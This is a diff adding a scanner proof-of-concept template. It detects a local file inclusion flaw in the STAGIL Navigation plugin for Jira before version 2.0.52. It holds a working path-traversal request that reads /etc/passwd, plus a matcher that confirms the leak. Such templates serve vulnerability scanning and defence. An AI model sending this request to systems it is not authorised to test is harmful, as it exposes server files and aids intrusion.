@@ -1,0 +1,16 @@
+id: poc-yaml-stagil-navigation-for-jira-menu
+info:
+  name: STAGIL Navigation for Jira Menu & Themes <2.0.52 - 本地文件包含
+  severity: high
+  tags:
+  - lfi
+  finger: Jira
+requests:
+- method: GET
+  path: /plugins/servlet/snjFooterNavigationConfig?fileName=../../../../etc/passwd&fileMime=$textMime
+  expression: 'contains(headers, "$textMime") &&  contains(body, "root:") && matches(body,
+    "root:[x*]:0:0:")
+
+    '
+variables: {}
+transport: http
